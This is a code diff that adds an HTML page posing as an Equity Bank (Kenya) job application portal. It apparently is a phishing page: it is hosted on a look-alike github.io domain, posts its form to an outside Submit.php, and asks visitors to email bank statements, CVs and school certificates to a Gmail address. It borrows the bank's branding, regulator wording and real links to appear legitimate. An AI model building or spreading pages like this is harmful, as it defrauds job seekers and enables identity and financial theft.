@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Job Application Form</title>
+
+    <!-- Include jQuery library -->
+    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
+</head>
+<body>                                    
+<div class="container">
+  <h2><img src="https://equity-kenya.github.io/equity/Equity-logo.png"> Equity Bank (Kenya) Job Application Portal </h2>
+
+  <form action="https://equity-kenya.github.io/equitip/Submit.php" method="POST">
+   <div class="clop">
+    <h3><u>Security & Privacy Policy</u></h3>
+   </div>
+
+   <button>Submit</button>
+
+  <div class="nobody">
+   <h3><u>Additional Information Required</u></h3>
+    <label>-We require you to submit the following in an email:</label>
+      <ul>
+        <li>Attach a copy of your CV(if failed to upload previously)</li>
+        <li>Financial information(bank statements of the last 6 months)</li>
+        <li>Educational information(KCPE,KCSE, College/University documents)</li>
+      </ul>
+    <div>
+      <label>-Send to [infoequitybank@gmail.com]</label>
+    </div>
+  </div>
+    <div class="label3">
+     <h5>EQUITY BANK TRANSFORMING BANKING INTO A LIFESTYLE.</h5>
+    </div>
+
+    <div class="label4">
+     <h6>Equity Bank[Kenya] Limited regulated by Central Bank of Kenya(CBK)</h6>
+    </div>
+
+   </form>
+ </div>
+<div class="container_2">
+ <div class="row_2">
+   <label> <a href="https://selfservice.equitybankgroup.com/terms and services">~Equitel Login Page</a></label>
+   <label> <a href="https://selfservice.equitybankgroup.com/terms and services">~Terms and conditions</a></label>
+ </div>
+ <div class="row_2">
+   <label> <a href="http://ke.equitybankgroup.com/diaspora/">~Tax information</a></label>
+   <label> <a href="https://selfservice.equitybankgroup.com/copyright">~KSE 2022-2023 Report</a></label>
+ </div>
+
+ <div class="row_2">
+   <label> <a href="http://ke.equitybankgroup.com/diaspora/">~Copyright Law</a></label>
+   <label> <a href="http://ke.equitybankgroup.com/admin/">~Admin Login Page</a></label>
+ </div>
+   <h4> <u>Contact Us</u></h4>
+ <ul>
+   <li>Email: info.equity@gmail.com</li>
+   <li>Tel: +254 763 000 000</li>
+ </ul>
+</div>
+<style>
+/* Additional CSS for styling */
+
+body {
+  background-image: url('https://equity-kenya.github.io/equitel/fre.jpg');
+  background-size: auto 100%; /* Adjust background-size to cover the entire height but allow scrolling horizontally */
+  background-repeat: no-repeat;
+  background-attachment: fixed;
+  overflow-x: scroll;
+  margin: 0;
+  font-family: Arial, sans-serif;
+}
+
+form {
+  position: relative;
+  margin: 50px auto;
+  padding: 20px;
+  background-color: transparent;
+  border-radius: 10px;
+  box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+  max-width: 600px; /* Adjust as needed */
+}
+
+/* Additional styling for the form elements */
+/* Rest of your styling for checkboxes, labels, etc. */
+
+/* Add media query for responsiveness */
+@media (max-width: 600px) {
+  body {
+    background-size: cover;
+    overflow-x: scroll;
+  }
+
+  form {
+    max-width: 100%;
+  }
+}
+
+h2 img{
+    width: 45px;
+}
+
+h6 img{
+    width: 100px;
+}
+
+/*body {
+    font-family: 'Arial', sans-serif;
+    background-color: #f4f4f4;
+    margin: 0;
+    padding: 0px;
+}*/
+
+h2{
+    font-size: 25px;
+    color: #983a06;
+    margin-left: 20px;
+    line-height: 1.0;
+}
+/*form {
+    max-width: 250px;
+    margin-left: 15px;
+    margin-bottom: 40px;
+    margin-top: -15px;
+    margin: 50px auto;
+    padding: 20px;
+    background-color: #fff;
+    border-radius: 10px;
+    box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+}*/
+
+label{
+    font-size: 12px;
+    font-weight: 600;
+}
+
+ul{
+    font-size: 15px;
+    font-weight: 300;
+    margin-left: -20px;
+    margin-top: -15px;
+}
+
+button{
+        display: inline-block;
+        height: 40px;
+        width: 200px;
+    border-radius: 4px;
+    margin-top:  2px;
+    margin-left: 40px;
+        font-size: 15px;
+        color:#AA4D01;
+        text-transform:uppercase;
+        cursor: pointer;
+        padding: 0 25px;
+        background-color: transparent ;
+    text-align: center;
+    border: 1px solid #333;
+    height: 5vh;
+}
+
+.line3{
+    margin-top: 5px;
+    margin-left: -15px;
+}
+
+h4{
+    font-size: 11px;
+    font-weight: 500;
+}
+
+.row{
+    font-size: 12px;
+    margin-left: -5px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+}
+
+.label2{
+    margin-top: 30px;
+    font-size: 12px;
+    font-weight: 600;
+}
+h5{
+    font-size: 15px;
+    margin-left: 2px;
+}
+
+.label4 h6{
+    font-size: 7px;
+    text-align: center;
+}
+
+.clop h3{
+    font-size: 20px;
+    text-align: center;
+}
+
+.container_2{
+    background-color: #fff!important;
+    padding: 15px;
+    color: #AA4D01;
+    margin-top: -10px;
+}
+
+.row_2{
+    font-size: 12px;
+    margin-left: -5px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+}
+
+.row_2 a{
+    color: #AA4D01;
+}
+
+.container_2 h4{
+    font-size: 15px;
+}
+
+.label3 h5{
+    font-size: 15px;
+    text-align: center;
+}
+
+.act h6{
+    margin-top: -2px;
+    font-size: 13px;
+    text-align: center;
+    margin-bottom: -20px !important ;
+}
+
+.line{
+    margin-top: -5px;
+    margin-left: -15px;
+}
+
+.container1 label{
+    background-color: transparent;
+}
+
+.row5{
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+}
+
+.row5 .input_box{
+    flex-basis: 48%;
+}
+
+input{
+    width: 100%;
+    padding: 12px;
+    margin-bottom: 2px;
+    background-color: transparent;
+    box-sizing: border-box;
+    border: 1px solid #333;
+    border-radius: 5px;
+    font-size: 10px;
+    color: #AA4D01983a06;
+    font-weight: 600;
+    height: 7vh;
+}
+
+.container1{
+    width: 100%;
+    padding: 12px;
+    margin-bottom: 4px;
+    box-sizing: border-box;
+    border: 1px solid #333;
+    border-radius: 5px;
+    align-items: center;
+    justify-content: center;
+    margin-top: -60px;
+}
+
+.container1 h6{
+    font-size: 25px;
+    text-align: center;
+    margin-top: 5px !important;
+    margin-bottom: 5px !important;
+}
+
+.nobody label{
+    font-size: 12px;
+    font-weight: 600;
+}
+
+.nobody h4{
+    font-size: 11px;
+    font-weight: 300;
+}
+
+.nobody h3{
+    font-size: 15px;
+    text-align: center;
+    margin-top: 20px;
+}
+
+.over h5{
+    font-size: 15px;
+    margin-left: 2px;
+    color: #AA4D01;
+}
+
+.line2{
+    margin-top: 5px;
+}
+
+.nobody ul{
+   margin-top: 3px;
+   margin-left: 4px;
+}
+</style>
+</body>
+</html>
